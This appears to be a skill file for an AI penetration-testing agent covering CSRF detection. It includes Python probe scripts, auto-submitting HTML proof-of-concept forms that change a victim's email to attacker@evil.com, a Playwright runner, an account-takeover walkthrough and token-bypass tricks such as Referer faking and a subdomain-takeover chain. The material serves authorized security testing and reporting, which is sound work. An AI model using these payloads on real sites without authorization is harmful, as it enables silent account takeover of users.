---
name: csrf
description: Elite CSRF testing with mandatory cross-origin state-change proof, SameSite analysis, UI navigation steps, real impact demonstration, and strict false-positive rejection for endpoints with proper protections
---

# CSRF — Cross-Site Request Forgery

CSRF forces authenticated users to unknowingly execute state-changing actions on a web application where they are authenticated. It abuses the browser's automatic cookie sending behavior to perform unauthorized actions on behalf of a victim.

**CRITICAL RULE: CSRF is only a vulnerability if an actual state-changing action can be performed without the user's knowledge or consent. Demonstrate the complete unauthorized action — not just that a token check is missing.**

---

## Real Impact Gate — Answer Before Reporting

1. **Can you demonstrate actual unauthorized state change?**
   - Required: complete a state-changing action cross-origin (change email, make payment, delete resource, add admin user, etc.)
   - NOT sufficient: bypass a CSRF token check without completing the action
   - NOT sufficient: show a missing token on a read-only (GET) endpoint

2. **Is the endpoint actually state-changing?**
   - State-changing: POST/PUT/PATCH/DELETE that modifies data, sends messages, changes settings, moves money
   - NOT state-changing: GET requests that only read data (CSRF on read-only endpoints is Low/Info)

3. **Is the session model CSRF-vulnerable?**
   - Cookie-based auth: CSRF-vulnerable (cookies sent automatically by browser)
   - Bearer token auth (Authorization header): NOT CSRF-vulnerable (headers not sent automatically)
   - Basic auth: CSRF-vulnerable (sent automatically)
   - API key in cookie: CSRF-vulnerable
   - API key in header: NOT CSRF-vulnerable (must be explicitly set by JS)

4. **Is SameSite=Strict or Lax protecting this endpoint?**
   - SameSite=Strict: cookies NOT sent on cross-site requests → CSRF NOT possible
   - SameSite=Lax: cookies sent on top-level GET navigation but NOT on cross-site POST/PUT/DELETE → POST-based CSRF NOT possible
   - SameSite=None or not set: cookies sent on all cross-site requests → CSRF possible
   - OLD browsers: SameSite not respected → test cross-browser

5. **Have you confirmed with a working cross-origin PoC HTML page?**
   - Build the HTML PoC page
   - Open it in a browser while logged into the target as the victim
   - Confirm the state change was completed

6. **What is the real business impact?**
   - Account takeover via email/password change: Critical
   - Financial action (payment, money transfer): Critical
   - Data deletion: High
   - Admin action: Critical
   - Low-impact profile change (bio text): Low

---

## High-Value CSRF Targets (Test These First)

These endpoints have the highest CSRF impact and should be tested first:

1. **Email change** — account takeover via email hijacking
2. **Password change** — direct account takeover
3. **MFA disable** — removes security control, enabling account takeover
4. **Payment/transfer** — direct financial impact
5. **API key generation** — credential theft
6. **OAuth connect/disconnect** — account hijacking or link severing
7. **Admin user creation/modification** — privilege escalation
8. **Account deletion** — data destruction
9. **SSH key/GPG key addition** — persistent access
10. **Webhook configuration** — exfiltration channel

---

## Session Model Assessment

Before testing CSRF, determine the session model:

```python
def assess_csrf_vulnerability(session_cookie, auth_header=None):
    """Determine if the app uses cookie-based auth (CSRF-prone) or header-based (CSRF-safe)"""
    
    # Check authentication mechanism
    if auth_header and "Bearer" in auth_header:
        print("BEARER TOKEN AUTH: Not CSRF-vulnerable (header not auto-sent cross-origin)")
        print("NOTE: If same endpoints also accept cookie auth → still test CSRF")
        return "bearer_token"
    
    if session_cookie:
        # Check SameSite attribute
        import re
        samesite = re.search(r'SameSite=([^;]+)', session_cookie, re.IGNORECASE)
        if samesite:
            samesite_value = samesite.group(1).strip().lower()
            if samesite_value == "strict":
                print("SAMESITE=STRICT: Cross-site requests blocked — CSRF not possible via POST")
                return "samesite_strict"
            elif samesite_value == "lax":
                print("SAMESITE=LAX: POST/PUT/DELETE CSRF not possible, but GET state-changes are still vulnerable")
                return "samesite_lax"
            else:  # None
                print("SAMESITE=NONE: Cookie sent on all cross-site requests — CSRF possible!")
                return "samesite_none"
        else:
            print("NO SAMESITE: Default browser behavior — CSRF possible (check Lax-by-default in modern browsers)")
            return "no_samesite"
    
    return "unknown"
```

---

## Testing Methodology

### Step 1: Inventory All State-Changing Endpoints via UI

**UI Navigation**:
```
Step 1: Log in as User A and enable proxy (Caido)
Step 2: Systematically perform EVERY state-changing action through the UI:
  - Change profile settings (name, bio, photo)
  - Change email address
  - Change password
  - Enable/disable 2FA
  - Connect/disconnect OAuth providers
  - Create/delete API keys
  - Send messages
  - Make purchases/payments
  - Invite users
  - Delete account
Step 3: In proxy history, find every request with method POST, PUT, PATCH, or DELETE
Step 4: For each request, note:
  - URL and method
  - Authentication: is it cookie-based? Bearer token?
  - CSRF protection: is there a CSRF token? Origin/Referer check?
  - Content-type: application/json? multipart/form-data?
  - SameSite cookie value
```

### Step 2: Check CSRF Protection on Each Endpoint

```python
def check_csrf_protection(endpoint_url, method, cookie, original_payload):
    """Check CSRF protection mechanisms on state-changing endpoint"""
    
    checks = {}
    
    # 1. Test without CSRF token
    payload_no_csrf = {k: v for k, v in original_payload.items() 
                       if "csrf" not in k.lower() and "token" not in k.lower()}
    r = requests.request(method, endpoint_url,
        json=payload_no_csrf,
        cookies={"session": cookie})
    checks["no_csrf_token"] = {
        "status": r.status_code,
        "success": r.status_code == 200 or (r.status_code < 400 and "error" not in r.text.lower())
    }
    
    # 2. Test with empty CSRF token
    payload_empty_csrf = dict(original_payload)
    for key in list(payload_empty_csrf.keys()):
        if "csrf" in key.lower():
            payload_empty_csrf[key] = ""
    r = requests.request(method, endpoint_url,
        json=payload_empty_csrf,
        cookies={"session": cookie})
    checks["empty_csrf_token"] = {"status": r.status_code}
    
    # 3. Test with invalid CSRF token
    payload_invalid_csrf = dict(original_payload)
    for key in list(payload_invalid_csrf.keys()):
        if "csrf" in key.lower():
            payload_invalid_csrf[key] = "INVALID_TOKEN_12345"
    r = requests.request(method, endpoint_url,
        json=payload_invalid_csrf,
        cookies={"session": cookie})
    checks["invalid_csrf_token"] = {"status": r.status_code}
    
    # 4. Test Origin header check
    r = requests.request(method, endpoint_url,
        json=original_payload,
        cookies={"session": cookie},
        headers={"Origin": "https://attacker.com"})
    checks["cross_origin"] = {"status": r.status_code}
    
    # 5. Test Referer removal
    r = requests.request(method, endpoint_url,
        json=original_payload,
        cookies={"session": cookie},
        headers={"Referer": ""})
    checks["no_referer"] = {"status": r.status_code}
    
    print(f"\nCSRF Check Results for {endpoint_url}:")
    for check, result in checks.items():
        print(f"  {check}: {result}")
    
    return checks
```

### Step 3: Build and Test Cross-Origin PoC

For every endpoint that passed Step 2 (missing or weak CSRF protection):

**For JSON endpoints (Content-Type: application/json)**:
```python
# Many JSON endpoints prevent simple CSRF because
# application/json triggers a CORS preflight in browsers.
# But some servers accept text/plain as JSON (bypass!):

def test_json_csrf_bypass(endpoint, cookie, payload_dict):
    """Test if JSON endpoint accepts text/plain content-type (CSRF bypass)"""
    
    # Convert JSON to text/plain format
    # Server-side JSON parsers sometimes accept this
    payload_str = str(payload_dict).replace("'", '"').replace(" ", "")
    
    r = requests.post(endpoint,
        data=payload_str,  # raw body, not JSON
        cookies={"session": cookie},
        headers={"Content-Type": "text/plain"})
    
    print(f"text/plain CSRF bypass: {r.status_code}")
    return r.status_code == 200
```

**HTML PoC for form-encoded endpoint**:
```html
<!-- CSRF PoC for email change endpoint -->
<!-- Host this at attacker.com/csrf_poc.html -->
<!-- When victim visits this page while logged into target.com, their email is changed -->

<!DOCTYPE html>
<html>
<head><title>CSRF Proof of Concept</title></head>
<body onload="document.forms[0].submit()">
<form method="POST" action="https://target.com/api/user/change-email">
    <input type="hidden" name="new_email" value="attacker@evil.com">
    <input type="hidden" name="confirm_email" value="attacker@evil.com">
</form>
<!-- Note: CSRF token field is intentionally missing — testing if it's required -->
<p>Loading...</p>
</body>
</html>
```

**HTML PoC for JSON endpoint via form-encoded**:
```html
<!-- Some servers accept form-encoded data as JSON when the field names match JSON keys -->
<form method="POST" action="https://target.com/api/user/change-email">
    <input type="hidden" name='{"new_email":"attacker@evil.com","confirm_email":"attacker@evil.com","_ignore":"' value='"}'>
</form>
```

**HTML PoC for multipart endpoint**:
```html
<form method="POST" action="https://target.com/api/user/update"
      enctype="multipart/form-data">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="password" value="NewPassword123">
</form>
```

### Step 4: Execute PoC and Confirm State Change

```python
from playwright.sync_api import sync_playwright

def execute_csrf_poc(victim_session_cookie, poc_html_file, target_domain, verification_url, verification_field):
    """Execute CSRF PoC and confirm state change"""
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)  # Show browser for screenshot
        context = browser.new_context()
        
        # Set victim's session cookie on target domain
        context.add_cookies([{
            "name": "session",
            "value": victim_session_cookie,
            "domain": target_domain,
            "path": "/"
        }])
        
        # Get state BEFORE attack
        page = context.new_page()
        page.goto(verification_url)
        before_state = page.locator(f"[data-field='{verification_field}']").text_content()
        print(f"State BEFORE: {verification_field} = {before_state}")
        page.screenshot(path="/workspace/csrf_before.png")
        
        # Execute the CSRF attack (open PoC page)
        page.goto(f"file://{poc_html_file}")
        page.wait_for_timeout(2000)  # Wait for form submission
        page.screenshot(path="/workspace/csrf_attack.png")
        
        # Check state AFTER attack
        page.goto(verification_url)
        page.wait_for_timeout(1000)
        after_state = page.locator(f"[data-field='{verification_field}']").text_content()
        print(f"State AFTER: {verification_field} = {after_state}")
        page.screenshot(path="/workspace/csrf_after.png")
        
        browser.close()
        
        if before_state != after_state:
            print(f"CSRF CONFIRMED: {verification_field} changed from '{before_state}' to '{after_state}'")
            return True
        else:
            print("CSRF: State unchanged — protection may be working")
            return False
```

---

## Content-Type Bypass Techniques

When JSON content-type normally requires preflight (protecting against CSRF):

```python
bypass_content_types = [
    "application/x-www-form-urlencoded",  # No preflight
    "multipart/form-data",                # No preflight
    "text/plain",                          # No preflight — some parsers accept JSON from text/plain
    "application/x-www-form-urlencoded;charset=UTF-8",
    "text/html",                           # Rarely accepted but worth trying
]

for ct in bypass_content_types:
    r = requests.post(endpoint,
        data=payload_as_string,
        cookies={"session": victim_cookie},
        headers={"Content-Type": ct, "Origin": "https://attacker.com"})
    print(f"Content-Type {ct}: {r.status_code}")
```

---

## SameSite Cookie Bypass Techniques

**When SameSite=Lax**: Cross-site POST is blocked, but:
- Top-level GET navigation with state-changing GET endpoints is still vulnerable
- Some old browsers don't support SameSite → test in Firefox < 79, Safari < 13.1
- Cookie was set WITHOUT SameSite 120+ days ago (Chrome lax-by-default applies after 2 minutes)

**When SameSite=None**: Everything is vulnerable if Secure is also set

**When SameSite is missing** (old apps): 
- Chrome 80+: treats as Lax by default → POST CSRF blocked
- Safari: may not apply Lax-by-default in all versions

---

## UI Reproduction Steps — Required in Every Report

```
CSRF EMAIL CHANGE UI REPRODUCTION STEPS:

PRE-REQUISITES:
- Victim (User A) is logged into https://target.com
- Attacker hosts malicious page at https://attacker.com/csrf.html

STEP-BY-STEP ATTACK:

Step 1: VICTIM SETUP:
  - Open browser, navigate to https://target.com/login
  - Log in as User A with valid credentials
  - Navigate to Profile → Settings
  - Note current email: usera@company.com
  - Screenshot: User A's settings page showing current email

Step 2: ATTACKER PREPARATION:
  - Create the CSRF PoC file (see Working PoC section)
  - Host it at https://attacker.com/csrf.html (or open as local file for testing)
  
Step 3: SOCIAL ENGINEERING (simulated):
  - Send victim a link to https://attacker.com/csrf.html
  - (In testing, open attacker.com/csrf.html in the same browser where victim is logged in)

Step 4: ATTACK EXECUTION:
  - Open https://attacker.com/csrf.html in victim's browser
  - The page automatically submits a form to https://target.com/api/user/change-email
  - Screenshot: The PoC page loading (may show blank page or loading spinner)
  - NOTE: The victim sees nothing happening — the attack is silent

Step 5: CONFIRM STATE CHANGE:
  - Navigate to https://target.com/profile/settings
  - Observe: email has been changed from usera@company.com to attacker@evil.com
  - Screenshot: Profile page showing the changed email address

Step 6: ACCOUNT TAKEOVER:
  - Use the "Forgot Password" flow with attacker@evil.com
  - The password reset link goes to attacker's email
  - Screenshot: Password reset email received at attacker@evil.com
  - Reset password and log in as victim
  - Screenshot: Successfully logged in as victim with full account access
```

---

## Complete Report Format

**TITLE**: CSRF on Email Change Endpoint — Account Takeover via One-Click Attack

**SEVERITY**: Critical (leads to full account takeover)

**RAW HTTP REQUEST** (the malicious cross-origin request):
```
POST /api/user/change-email HTTP/1.1
Host: target.com
Cookie: session=VICTIM_SESSION_TOKEN   ← automatically sent by browser
Content-Type: application/x-www-form-urlencoded
Origin: https://attacker.com           ← cross-origin
Referer: https://attacker.com/csrf.html

new_email=attacker%40evil.com&confirm_email=attacker%40evil.com
```
Note: No CSRF token present — server accepts the request anyway

**RAW HTTP RESPONSE**:
```
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Email updated successfully"}
```

**EXACT LOCATION**:
- URL: POST https://target.com/api/user/change-email
- Missing protection: No CSRF token required. No Origin/Referer validation. Cookie is SameSite=None.
- UI location: Dashboard → Settings → Security → Change Email → "Change Email" button

**WORKING POC**:
```html
<!-- Save as csrf_email_change.html, open in victim's browser while victim is logged in -->
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body onload="document.forms[0].submit()">
<form method="POST" action="https://target.com/api/user/change-email" style="display:none">
    <input type="hidden" name="new_email" value="attacker@evil.com">
    <input type="hidden" name="confirm_email" value="attacker@evil.com">
    <!-- Note: no CSRF token field included — testing if it's required -->
</form>
<p>Loading... please wait</p>
</body>
</html>
```

**VALIDATION**:
- Signal 1: Removed CSRF token from email change request via proxy — server accepted it with HTTP 200 and "Email updated successfully" response
- Signal 2: Opened CSRF PoC page in victim's browser (while logged in) → navigated back to /profile/settings → confirmed email changed from usera@company.com to attacker@evil.com. Used "Forgot Password" with attacker@evil.com and received password reset email, completing account takeover.
- Cross-origin confirmed: YES — PoC hosted at file://localhost, confirmed cross-origin request sent with victim's session cookie
- State change confirmed: YES — email in database changed (verified by checking profile page and receiving password reset email at attacker's address)

**REAL IMPACT**:
Any attacker who tricks an authenticated user into visiting a malicious webpage (via phishing email, social media post, malicious advertisement, or XSS on another site) can silently change the victim's email address to attacker@evil.com. The attacker then uses the "Forgot Password" feature to receive a password reset link at their email and takes over the victim's account completely. The victim receives no warning, no confirmation email to their old address, and no indication that their account has been compromised. This enables full account takeover with zero interaction beyond visiting a single malicious page. All [N] registered users are at risk.

**RECOMMENDED FIX**:
1. Primary: Implement synchronizer token pattern — generate a unique, cryptographically random CSRF token per session, include in all forms, validate server-side:
   ```python
   # Generate: csrf_token = secrets.token_urlsafe(32), store in session
   # Validate: if request.form.get('csrf_token') != session['csrf_token']: abort(403)
   ```
2. Secondary: Set SameSite=Strict on session cookies:
   `Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict`
3. Secondary: Validate Origin header for state-changing requests:
   ```python
   allowed_origins = ['https://target.com', 'https://www.target.com']
   if request.headers.get('Origin') not in allowed_origins: abort(403)
   ```
4. For email change specifically: require current password confirmation — this prevents CSRF even if token is missing
5. Verification: After fix, confirm PoC page no longer changes the email (server returns 403)

---

## False Positive Rejection Rules

- CSRF on a GET endpoint that is truly read-only: NOT a vulnerability (reading data cross-origin via CSRF is a CORS issue, not CSRF)
- CSRF token missing but endpoint uses Bearer token (Authorization header): NOT CSRF-vulnerable (headers not sent cross-origin automatically)
- CSRF token missing but SameSite=Strict is set: NOT exploitable in modern browsers (mark as defense-in-depth recommendation only)
- CSRF token missing on low-impact action (e.g., changing notification sound preference): Low severity at most
- Login CSRF without further impact: Low only (forces victim to be logged in as attacker, but victim will notice)
- Logout CSRF alone: Low (annoying but no data theft, unless chained with other vulnerabilities)



## Additional Techniques — ported from WebSkills (csrf-test)

Concrete token-defeat bypasses to try when a CSRF token *is* present and the content-type/SameSite bypasses above did not apply:

**Double-submit cookie bypass (attacker-chosen matching tokens)**
If validation only checks that the `csrf_token` cookie equals the `csrf_token` body field (never that either is server-issued), set BOTH to the same arbitrary value. If the app reflects/accepts an attacker-set cookie (e.g. via a cookie-injection sink or a subdomain that can set cookies on the parent domain), the check passes:
```
Cookie: csrf_token=not_a_real_token
Body:   csrf_token=not_a_real_token
```

**Static-vs-dynamic token part**
Some anti-CSRF tokens concatenate a static (per-account, never-rotating) segment and a dynamic (per-request) segment. In Burp, diff several tokens for the same user: if a leading/trailing substring is constant, try submitting ONLY the static part (or padding the dynamic part with a fixed length). Reused old tokens from prior requests that still validate = broken integrity → treat as no protection.

**Token = reversible hash**
If the token looks like a hash/encoded value, try to identify and reverse it (base64/hex/md5-of-known-input). A token derived from a predictable value (username, timestamp, user id) is attacker-forgeable.

**User-Agent-based skip**
Some backends skip the anti-CSRF check for "mobile"/"app" clients. Replay the state-changing request from a browser/tablet/mobile `User-Agent` string; if the token requirement disappears, the CSRF page just needs the same UA.

**Referer-check defeat via History API**
When the server validates Referer by substring (`contains target.com`), pair the classic `<meta name="referrer" content="no-referrer">` removal with a `history.pushState` to fake the path so a naive check sees a "trusted-looking" Referer:
```html
<script>history.pushState('', '', '/anything@target.com')</script>
<!-- Referer becomes https://evil.com/anything@target.com — passes a `contains target.com` check -->
```

**Subdomain-takeover + CORS chain to steal the token**
If the token is only readable same-origin but a dangling subdomain of the target can be taken over AND CORS trusts `*.target.com`, host script on the taken-over subdomain to read the token cross-origin (`withCredentials`) and then submit the forged request. This converts an otherwise-protected endpoint into a CSRF (chains with cors_misconfiguration.md and subdomain_takeover.md).
